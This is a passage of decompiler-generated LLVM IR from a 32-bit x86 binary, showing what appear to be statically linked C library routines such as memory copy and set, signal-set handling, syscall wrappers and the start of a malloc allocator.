  %v3_805309e = icmp eq i32 %v2_805309e, 0
  br i1 %v3_805309e, label %dec_label_pc_805305c, label %dec_label_pc_80530a3.loopexit

dec_label_pc_80530a3.loopexit:                    ; preds = %dec_label_pc_8053087
  br label %dec_label_pc_80530a3

dec_label_pc_80530a3:                             ; preds = %dec_label_pc_80530a3.loopexit, %dec_label_pc_8053079
  store i32 %v2_8053047, i32* @eax, align 4
  %v2_80530ac = call i32 @function_8054a40(i32 %v2_8053047, i32 1)
  %v0_80530b1 = load i32, i32* @ebx, align 4
  %v2_80530b6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80530b6, i32* @ebx, align 4
  store i32 %v0_8053035, i32* @esi, align 4
  ret i32 %v0_80530b1

; uselistorder directives
  uselistorder i32 %v1_8053095, { 1, 0 }
  uselistorder i32 %v0_805305c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8053087, { 1, 0 }
}

define i32 @function_80530b9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80530b9:
  ret i32 ptrtoint (i32* @global_var_80572d4.203 to i32)
}

define i32 @function_80530bf() local_unnamed_addr {
dec_label_pc_80530bf:
  %tmp = call i64 @__decompiler_undefined_function_5()
  %stack_var_-16 = alloca i32, align 4
  %v1_80530c7 = bitcast i32* %stack_var_-16 to %tms*
  %v2_80530c7 = call i32 @function_8055257(%tms* %v1_80530c7)
  %v4_80530cc = trunc i64 %tmp to i32
  %v4_80530d0 = load i32, i32* %stack_var_-16, align 4
  %v5_80530d0 = add i32 %v4_80530d0, %v4_80530cc
  %v3_80530d7 = mul i32 %v5_80530d0, 10000
  %v1_80530dd = and i32 %v3_80530d7, 2147483632
  ret i32 %v1_80530dd

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_80530e3(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80530e3:
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_80530e4 = load i32, i32* @esi, align 4
  store i32 %v0_80530e4, i32* %stack_var_-8, align 4
  %v4_80530e5 = ptrtoint i8* %arg1 to i32
  %v9_80530f1 = icmp ugt i8* %tmp3, %arg1
  %v1_80530f3 = icmp eq i1 %v9_80530f1, false
  br i1 %v1_80530f3, label %dec_label_pc_80530fb, label %dec_label_pc_80530f5

dec_label_pc_80530f5:                             ; preds = %dec_label_pc_80530e3
  %v7_80530f7 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %arg3)
  br label %dec_label_pc_8053107

dec_label_pc_80530fb:                             ; preds = %dec_label_pc_80530e3
  %v3_80530fb = add i32 %arg2, -1
  %v4_80530fb = add i32 %v3_80530fb, %arg3
  %v5_80530fb = inttoptr i32 %v4_80530fb to i8*
  %v3_80530ff = add i32 %v4_80530e5, -1
  %v4_80530ff = add i32 %v3_80530ff, %arg3
  %v5_80530ff = inttoptr i32 %v4_80530ff to i8*
  %v7_8053104 = call i8* @_memcpy(i8* %v5_80530ff, i8* %v5_80530fb, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8053107

dec_label_pc_8053107:                             ; preds = %dec_label_pc_80530f5, %dec_label_pc_80530fb
  %v2_8053107 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053107, i32* @esi, align 4
  ret i32 %v4_80530e5

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053107, { 1, 0 }
}

define i32 @function_805310a(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805310a:
  %v0_805310a = load i32, i32* @edi, align 4
  %v4_8053113 = ptrtoint i8* %arg1 to i32
  %v5_8053117 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_805310a, i32* @edi, align 4
  ret i32 %v4_8053113

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_805311f(i32 %arg1) local_unnamed_addr {
dec_label_pc_805311f:
  %stack_var_-4 = alloca i32, align 4
  %v2_8053122 = ptrtoint i32* %stack_var_-4 to i32
  %v2_805312b = inttoptr i32 %arg1 to i8*
  %v3_805312b = call i32 @function_8055329(i8* %v2_805312b, i32 %v2_8053122)
  %v1_8053136 = icmp eq i32 %v3_805312b, 0
  br i1 %v1_8053136, label %dec_label_pc_805313e, label %dec_label_pc_805313a

dec_label_pc_805313a:                             ; preds = %dec_label_pc_805311f
  %v3_805313a = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805313e

dec_label_pc_805313e:                             ; preds = %dec_label_pc_805311f, %dec_label_pc_805313a
  %v0_805313e = phi i32 [ -1, %dec_label_pc_805311f ], [ %v3_805313a, %dec_label_pc_805313a ]
  ret i32 %v0_805313e

; uselistorder directives
  uselistorder label %dec_label_pc_805313e, { 1, 0 }
}

define i32 @function_8053144(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8053144:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805315f = ptrtoint i32* %stack_var_-12 to i32
  %v2_8053166 = call i32 @function_8054d73(i32 5, i32 %v2_805315f)
  ret i32 %v2_8053166

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_805316f(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805316f:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805318a = ptrtoint i32* %stack_var_-12 to i32
  %v2_8053191 = call i32 @function_8054d73(i32 2, i32 %v2_805318a)
  ret i32 %v2_8053191

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_805319a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805319a:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80531b5 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80531bc = call i32 @function_8054d73(i32 3, i32 %v2_80531b5)
  ret i32 %v2_80531bc

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80531c5(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80531c5:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80531e0 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80531e7 = call i32 @function_8054d73(i32 6, i32 %v2_80531e0)
  ret i32 %v2_80531e7

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80531f0() local_unnamed_addr {
dec_label_pc_80531f0:
  %stack_var_-20 = alloca i32, align 4
  %v2_805321b = ptrtoint i32* %stack_var_-20 to i32
  %v2_8053222 = call i32 @function_8054d73(i32 15, i32 %v2_805321b)
  ret i32 %v2_8053222
}

define i32 @function_805322b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805322b:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_805323e = ptrtoint i32* %stack_var_-8 to i32
  %v2_8053245 = call i32 @function_8054d73(i32 4, i32 %v2_805323e)
  ret i32 %v2_8053245

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_805324e() local_unnamed_addr {
dec_label_pc_805324e:
  %stack_var_-16 = alloca i32, align 4
  %v2_8053271 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8053278 = call i32 @function_8054d73(i32 10, i32 %v2_8053271)
  ret i32 %v2_8053278
}

define i32 @function_8053281() local_unnamed_addr {
dec_label_pc_8053281:
  %stack_var_-24 = alloca i32, align 4
  %v2_80532b4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80532bb = call i32 @function_8054d73(i32 12, i32 %v2_80532b4)
  ret i32 %v2_80532bb
}

define i32 @function_80532c4() local_unnamed_addr {
dec_label_pc_80532c4:
  %stack_var_-16 = alloca i32, align 4
  %v2_80532e7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_80532ee = call i32 @function_8054d73(i32 9, i32 %v2_80532e7)
  ret i32 %v2_80532ee
}

define i32 @function_80532f7() local_unnamed_addr {
dec_label_pc_80532f7:
  %stack_var_-24 = alloca i32, align 4
  %v2_805332a = ptrtoint i32* %stack_var_-24 to i32
  %v2_8053331 = call i32 @function_8054d73(i32 11, i32 %v2_805332a)
  ret i32 %v2_8053331
}

define i32 @function_805333a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_805333a:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8053365 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805336c = call i32 @function_8054d73(i32 14, i32 %v2_8053365)
  ret i32 %v2_805336c

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8053375(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8053375:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8053390 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8053397 = call i32 @function_8054d73(i32 1, i32 %v2_8053390)
  ret i32 %v2_8053397

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8054d73, { 5, 4, 9, 3, 8, 2, 7, 1, 10, 0, 6, 11 }
}

define i32 @function_80533a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_80533a0:
  %v0_80533a3 = call i32 @function_8052bd5()
  %v0_80533a8 = load i32, i32* @edx, align 4
  %v4_80533af = call i32 @function_8052c60(i32 %v0_80533a3, i32 %arg1, i32 %v0_80533a8, i32 %v0_80533a8)
  ret i32 %v4_80533af

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @function_8052c60, { 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_8052bd5, { 0, 2, 1 }
}

define i32 @function_80533b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_80533b8:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_80533d0, label %dec_label_pc_80533c3

dec_label_pc_80533c3:                             ; preds = %dec_label_pc_80533b8
  %v1_80533c3 = add i32 %arg1, -64
  %v3_80533c3 = sub i32 63, %arg1
  %v4_80533c3 = and i32 %v3_80533c3, %arg1
  %v5_80533c3 = icmp slt i32 %v4_80533c3, 0
  %v6_80533c3 = icmp eq i32 %v1_80533c3, 0
  %v7_80533c3 = icmp slt i32 %v1_80533c3, 0
  %v3_80533c6 = icmp eq i1 %v7_80533c3, %v5_80533c3
  %v4_80533c6 = icmp eq i1 %v6_80533c3, false
  %v5_80533c6 = and i1 %v4_80533c6, %v3_80533c6
  br i1 %v5_80533c6, label %dec_label_pc_80533d0, label %dec_label_pc_80533c8

dec_label_pc_80533c8:                             ; preds = %dec_label_pc_80533c3
  %v4_80533cb = call i32 @function_80534ce(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80533d0

dec_label_pc_80533d0:                             ; preds = %dec_label_pc_80533c3, %dec_label_pc_80533b8, %dec_label_pc_80533c8
  %v1_80533d0 = call i32 @function_80530b9(i32 ptrtoint (i32* @0 to i32))
  %v1_80533d5 = inttoptr i32 %v1_80533d0 to i32*
  store i32 22, i32* %v1_80533d5, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_80533c3, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80533d0, { 2, 0, 1 }
}

define i32 @function_80533e2(i32 %arg1) local_unnamed_addr {
dec_label_pc_80533e2:
  %v3_80533f0 = inttoptr i32 %arg1 to i8*
  %v4_80533f0 = call i32 @function_805310a(i8* %v3_80533f0, i32 0, i32 128)
  ret i32 0
}

define i32 @function_80533fb(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80533fb:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_80533fb = load i32, i32* @ebx, align 4
  %v15_80533fc = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8053410 = icmp eq i32 %arg2, -1
  br i1 %v10_8053410, label %dec_label_pc_805341e, label %dec_label_pc_8053415

dec_label_pc_8053415:                             ; preds = %dec_label_pc_80533fb
  %tmp25 = icmp slt i32 %arg1, 1
  br i1 %tmp25, label %dec_label_pc_805341e, label %dec_label_pc_8053419

dec_label_pc_8053419:                             ; preds = %dec_label_pc_8053415
  %v7_805341c = icmp sgt i32 %arg1, 64
  br i1 %v7_805341c, label %dec_label_pc_805341e, label %dec_label_pc_8053439.lr.ph

dec_label_pc_805341e:                             ; preds = %dec_label_pc_8053419, %dec_label_pc_8053415, %dec_label_pc_80533fb
  %v1_805341e = call i32 @function_80530b9(i32 %v0_80533fb)
  store i32 %v1_805341e, i32* %eax.global-to-local, align 4
  %v1_8053423 = inttoptr i32 %v1_805341e to i32*
  store i32 22, i32* %v1_8053423, align 4
  br label %dec_label_pc_805349f

dec_label_pc_8053439.lr.ph:                       ; preds = %dec_label_pc_8053419
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805343927 = add i32 %v15_80533fc, 284
  %v5_805343928 = inttoptr i32 %v4_805343927 to i32*
  store i32 0, i32* %v5_805343928, align 4
  %v0_805344429 = load i32, i32* %eax.global-to-local, align 4
  %v1_805344430 = add i32 %v0_805344429, -1
  %v9_805344431 = icmp slt i32 %v1_805344430, 0
  store i32 %v1_805344430, i32* %eax.global-to-local, align 4
  %v1_805344532 = icmp eq i1 %v9_805344431, false
  br i1 %v1_805344532, label %dec_label_pc_8053439.dec_label_pc_8053439_crit_edge, label %dec_label_pc_8053447

dec_label_pc_8053439.dec_label_pc_8053439_crit_edge: ; preds = %dec_label_pc_8053439.lr.ph, %dec_label_pc_8053439.dec_label_pc_8053439_crit_edge
  %v1_805344433 = phi i32 [ %v1_8053444, %dec_label_pc_8053439.dec_label_pc_8053439_crit_edge ], [ %v1_805344430, %dec_label_pc_8053439.lr.ph ]
  %v0_8053439.pre = load i32, i32* @esp, align 4
  %v2_8053439 = mul i32 %v1_805344433, 4
  %v3_8053439 = add i32 %v0_8053439.pre, 160
  %v4_8053439 = add i32 %v3_8053439, %v2_8053439
  %v5_8053439 = inttoptr i32 %v4_8053439 to i32*
  store i32 0, i32* %v5_8053439, align 4
  %v0_8053444 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053444 = add i32 %v0_8053444, -1
  %v9_8053444 = icmp slt i32 %v1_8053444, 0
  store i32 %v1_8053444, i32* %eax.global-to-local, align 4
  %v1_8053445 = icmp eq i1 %v9_8053444, false
  br i1 %v1_8053445, label %dec_label_pc_8053439.dec_label_pc_8053439_crit_edge, label %dec_label_pc_8053447

dec_label_pc_8053447:                             ; preds = %dec_label_pc_8053439.dec_label_pc_8053439_crit_edge, %dec_label_pc_8053439.lr.ph
  %v0_8053447 = load i32, i32* @edx, align 4
  %v2_805344a = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_805344a, i32* %eax.global-to-local, align 4
  %v4_8053452 = call i32 @function_80534ce(i32 %v2_805344a, i32 %arg1, i32 %v0_8053447, i32 %v0_8053447)
  store i32 %v4_8053452, i32* %eax.global-to-local, align 4
  %v2_805345a = icmp slt i32 %v4_8053452, 0
  br i1 %v2_805345a, label %dec_label_pc_805349f, label %dec_label_pc_805345e

dec_label_pc_805345e:                             ; preds = %dec_label_pc_8053447
  %v4_8053466 = call i32 @function_80534aa(i32 ptrtoint (i32* @global_var_80574c0.204 to i32), i32 %arg1, i32 %v4_8053452, i32 %v4_8053452)
  %v2_805347f = ptrtoint i32* %stack_var_-284 to i32
  %v2_8053484 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8053484, i32* %eax.global-to-local, align 4
  %v4_805348d = call i32 @function_8054c7f(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_805347f)
  store i32 %v4_805348d, i32* %eax.global-to-local, align 4
  %v2_8053495 = icmp slt i32 %v4_805348d, 0
  br i1 %v2_8053495, label %dec_label_pc_805349f, label %dec_label_pc_8053499

dec_label_pc_8053499:                             ; preds = %dec_label_pc_805345e
  %v3_8053499 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_80534a2

dec_label_pc_805349f:                             ; preds = %dec_label_pc_805345e, %dec_label_pc_8053447, %dec_label_pc_805341e
  br label %dec_label_pc_80534a2

dec_label_pc_80534a2:                             ; preds = %dec_label_pc_8053499, %dec_label_pc_805349f
  %storemerge = phi i32 [ -1, %dec_label_pc_805349f ], [ %v3_8053499, %dec_label_pc_8053499 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8053444, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 10, 11, 8, 9, 5, 6 }
  uselistorder i32 284, { 0, 4, 5, 6, 1, 2, 3, 7, 8, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_80534a2, { 1, 0 }
  uselistorder label %dec_label_pc_8053439.dec_label_pc_8053439_crit_edge, { 1, 0 }
}

define i32 @function_80534aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80534aa:
  %v1_80534b8 = add i32 %arg2, -1
  %v1_80534bb = urem i32 %v1_80534b8, 32
  %v2_80534bb = icmp eq i32 %v1_80534bb, 0
  %v2_80534be = udiv i32 %v1_80534b8, 32
  br i1 %v2_80534bb, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_80534aa
  %v5_80534c1 = shl i32 1, %v1_80534bb
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_80534aa, %bb
  %v6_80534c3 = phi i32 [ 1, %dec_label_pc_80534aa ], [ %v5_80534c1, %bb ]
  %v2_80534c3 = mul nuw nsw i32 %v2_80534be, 4
  %v3_80534c3 = add i32 %v2_80534c3, %arg1
  %v4_80534c3 = inttoptr i32 %v3_80534c3 to i32*
  %v5_80534c3 = load i32, i32* %v4_80534c3, align 4
  %v7_80534c3 = and i32 %v5_80534c3, %v6_80534c3
  %v8_80534c3 = icmp eq i32 %v7_80534c3, 0
  %v1_80534c7 = icmp eq i1 %v8_80534c3, false
  %v2_80534c7 = zext i1 %v1_80534c7 to i32
  ret i32 %v2_80534c7

; uselistorder directives
  uselistorder i32 %v1_80534bb, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_80534ce(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80534ce:
  %stack_var_-4 = alloca i32, align 4
  %v0_80534ce = load i32, i32* @ebx, align 4
  store i32 %v0_80534ce, i32* %stack_var_-4, align 4
  %v1_80534dc = add i32 %arg2, -1
  %v1_80534df = urem i32 %v1_80534dc, 32
  %v2_80534df = icmp eq i32 %v1_80534df, 0
  store i32 %v1_80534df, i32* @ecx, align 4
  %v2_80534e2 = udiv i32 %v1_80534dc, 32
  store i32 %v2_80534e2, i32* @edx, align 4
  br i1 %v2_80534df, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_80534ce
  %v5_80534e5 = shl i32 1, %v1_80534df
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_80534ce, %bb
  %v6_80534e7 = phi i32 [ 1, %dec_label_pc_80534ce ], [ %v5_80534e5, %bb ]
  %v2_80534e7 = mul nuw nsw i32 %v2_80534e2, 4
  %v3_80534e7 = add i32 %v2_80534e7, %arg1
  %v4_80534e7 = inttoptr i32 %v3_80534e7 to i32*
  %v5_80534e7 = load i32, i32* %v4_80534e7, align 4
  %v7_80534e7 = or i32 %v5_80534e7, %v6_80534e7
  store i32 %v7_80534e7, i32* %v4_80534e7, align 4
  %v2_80534ec = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80534ec, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_80534e2, { 1, 0 }
  uselistorder i32 %v1_80534df, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_80534ee() local_unnamed_addr {
dec_label_pc_80534ee:
  %v0_80534ee = load i32, i32* @eax, align 4
  %v6_8053501 = icmp ugt i32 %v0_80534ee, 16777215
  br i1 %v6_8053501, label %dec_label_pc_8053512, label %dec_label_pc_8053503

dec_label_pc_8053503:                             ; preds = %dec_label_pc_80534ee
  %tmp = icmp ult i32 %v0_80534ee, 256
  %v2_80534f1 = udiv i32 %v0_80534ee, 256
  %v2_8053503 = call i32 @llvm.ctlz.i32(i32 %v2_80534f1, i1 true)
  %v3_8053503 = xor i32 %v2_8053503, 31
  %v5_8053503 = select i1 %tmp, i32 95, i32 %v3_8053503
  %v1_8053506 = add nuw nsw i32 %v5_8053503, 6
  %v2_8053509 = urem i32 %v1_8053506, 32
  %v4_8053509 = icmp eq i32 %v2_8053509, 0
  br i1 %v4_8053509, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8053503
  %v5_8053509 = lshr i32 %v0_80534ee, %v2_8053509
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8053503, %bb
  %v0_805350b = phi i32 [ %v0_80534ee, %dec_label_pc_8053503 ], [ %v5_8053509, %bb ]
  %v1_805350b = urem i32 %v0_805350b, 4
  %v2_805350e = mul nuw nsw i32 %v5_8053503, 4
  %v3_805350e = or i32 %v1_805350b, 32
  %v4_805350e = add nuw nsw i32 %v3_805350e, %v2_805350e
  br label %dec_label_pc_8053512

dec_label_pc_8053512:                             ; preds = %dec_label_pc_80534ee, %bb4
  %v0_8053513 = phi i32 [ 95, %dec_label_pc_80534ee ], [ %v4_805350e, %bb4 ]
  ret i32 %v0_8053513

; uselistorder directives
  uselistorder i32 %v2_8053509, { 1, 0 }
  uselistorder i32 %v0_80534ee, { 2, 3, 1, 0, 4 }
  uselistorder i1 true, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053512, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_8053514(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053514:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053514 = load i32, i32* @ebp, align 4
  %v0_8053515 = load i32, i32* @edi, align 4
  %v0_8053516 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8053529 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053529, i32* @eax, align 4
  store i32 %v2_8053529, i32* %stack_var_-92, align 4
  %v2_805352e = call i32 @function_8054a40(i32 %v2_8053529, i32 134564413)
  store i32 %v2_805352e, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80571a0.205 to i32), i32* %stack_var_-92, align 4
  %v1_805353a = call i32 @function_8054a3d(i32 ptrtoint (i32* @global_var_80571a0.205 to i32))
  store i32 %v1_805353a, i32* %eax.global-to-local, align 4
  %v0_8053542 = load i32, i32* %ebx.global-to-local, align 4
  %tmp124 = icmp ult i32 %v0_8053542, -32
  br i1 %tmp124, label %dec_label_pc_8053559, label %dec_label_pc_8053547

dec_label_pc_8053547:                             ; preds = %dec_label_pc_8053514
  %v0_8053547 = load i32, i32* %stack_var_-92, align 4
  %v1_8053547 = call i32 @function_80530b9(i32 %v0_8053547)
  store i32 %v1_8053547, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805354e = inttoptr i32 %v1_8053547 to i32*
  store i32 12, i32* %v1_805354e, align 4
  br label %dec_label_pc_8053c7e

dec_label_pc_8053559:                             ; preds = %dec_label_pc_8053514
  %v1_8053559 = add i32 %v0_8053542, 11
  %tmp125 = icmp ult i32 %v1_8053559, 16
  br i1 %tmp125, label %dec_label_pc_8053570, label %dec_label_pc_8053569

dec_label_pc_8053569:                             ; preds = %dec_label_pc_8053559
  %v1_8053569 = and i32 %v1_8053559, -8
  br label %dec_label_pc_8053570

dec_label_pc_8053570:                             ; preds = %dec_label_pc_8053559, %dec_label_pc_8053569
  %storemerge135 = phi i32 [ %v1_8053569, %dec_label_pc_8053569 ], [ %v1_8053559, %dec_label_pc_8053559 ]
  %v1_8053908 = phi i32 [ %v1_8053569, %dec_label_pc_8053569 ], [ 16, %dec_label_pc_8053559 ]
  store i32 %storemerge135, i32* %eax.global-to-local, align 4
  %v0_8053570 = load i8, i8* @global_var_8057540.206, align 1
  %v1_8053570 = sext i8 %v0_8053570 to i32
  store i32 %v1_8053570, i32* @ebx, align 4
  %v3_8053576 = urem i8 %v0_8053570, 2
  %v4_8053576 = icmp eq i8 %v3_8053576, 0
  %v1_8053579 = icmp eq i1 %v4_8053576, false
  br i1 %v1_8053579, label %dec_label_pc_8053598, label %dec_label_pc_805357b

dec_label_pc_805357b:                             ; preds = %dec_label_pc_8053570
  %v2_805357b = icmp eq i8 %v0_8053570, 0
  %v1_805357d = icmp eq i1 %v2_805357b, false
  br i1 %v1_805357d, label %dec_label_pc_8053873, label %dec_label_pc_8053583

dec_label_pc_8053583:                             ; preds = %dec_label_pc_805357b
  store i32 ptrtoint (i8* @global_var_8057540.206 to i32), i32* %stack_var_-92, align 4
  %v2_805358b = call i32 @function_8054131(i32* bitcast (i8* @global_var_8057540.206 to i32*))
  store i32 %v2_805358b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053873

dec_label_pc_8053598:                             ; preds = %dec_label_pc_8053570
  %v11_8053598 = trunc i32 %v1_8053908 to i8
  %v8_805359c = icmp ugt i8 %v11_8053598, %v0_8053570
  br i1 %v8_805359c, label %dec_label_pc_80535b9, label %dec_label_pc_805359e

dec_label_pc_805359e:                             ; preds = %dec_label_pc_8053598
  %v2_80535a2 = udiv i32 %v1_8053908, 2
  store i32 %v2_80535a2, i32* %eax.global-to-local, align 4
  %v1_80535a4 = add i32 %v2_80535a2, ptrtoint (i8* @global_var_8057540.206 to i32)
  store i32 %v1_80535a4, i32* %ecx.global-to-local, align 4
  %v1_80535aa = add i32 %v2_80535a2, add (i32 ptrtoint (i8* @global_var_8057540.206 to i32), i32 -4)
  %v2_80535aa = inttoptr i32 %v1_80535aa to i32*
  %v3_80535aa = load i32, i32* %v2_80535aa, align 4
  store i32 %v3_80535aa, i32* @edx, align 4
  %v1_80535ad = icmp eq i32 %v3_80535aa, 0
  br i1 %v1_80535ad, label %dec_label_pc_80535b9, label %dec_label_pc_80535b1

dec_label_pc_80535b1:                             ; preds = %dec_label_pc_805359e
  %v1_80535b1 = add i32 %v3_80535aa, 8
  %v2_80535b1 = inttoptr i32 %v1_80535b1 to i32*
  %v3_80535b1 = load i32, i32* %v2_80535b1, align 4
  store i32 %v3_80535b1, i32* %eax.global-to-local, align 4
  store i32 %v3_80535b1, i32* %v2_80535aa, align 4
  br label %dec_label_pc_80535f2

dec_label_pc_80535b9:                             ; preds = %dec_label_pc_805359e, %dec_label_pc_8053598
  %v8_80535b9 = icmp ult i32 %v1_8053908, 255
  %v6_80535c1 = icmp ugt i32 %v1_8053908, 255
  store i32 %v1_8053908, i32* @eax, align 4
  br i1 %v6_80535c1, label %dec_label_pc_80535fa, label %dec_label_pc_80535c3

dec_label_pc_80535c3:                             ; preds = %dec_label_pc_80535b9
  %v2_80535c7 = udiv i32 %v1_8053908, 8
  store i32 %v2_80535c7, i32* %eax.global-to-local, align 4
  %v1_80535ce = mul nuw i32 %v2_80535c7, 8
  %v2_80535ce = add i32 %v1_80535ce, ptrtoint (i32* @global_var_805756c.207 to i32)
  store i32 %v2_80535ce, i32* %ecx.global-to-local, align 4
  %v1_80535d5 = add i32 %v1_80535ce, add (i32 ptrtoint (i32* @global_var_805756c.207 to i32), i32 12)
  %v2_80535d5 = inttoptr i32 %v1_80535d5 to i32*
  %v3_80535d5 = load i32, i32* %v2_80535d5, align 4
  store i32 %v3_80535d5, i32* @edx, align 4
  %v12_80535d8 = icmp eq i32 %v3_80535d5, %v2_80535ce
  br i1 %v12_80535d8, label %dec_label_pc_80536f6.preheader, label %dec_label_pc_80535e0

dec_label_pc_80535e0:                             ; preds = %dec_label_pc_80535c3
  store i32 %v1_8053908, i32* %ebx.global-to-local, align 4
  %v1_80535e4 = add i32 %v3_80535d5, 12
  %v2_80535e4 = inttoptr i32 %v1_80535e4 to i32*
  %v3_80535e4 = load i32, i32* %v2_80535e4, align 4
  store i32 %v3_80535e4, i32* %eax.global-to-local, align 4
  store i32 %v3_80535e4, i32* %v2_80535d5, align 4
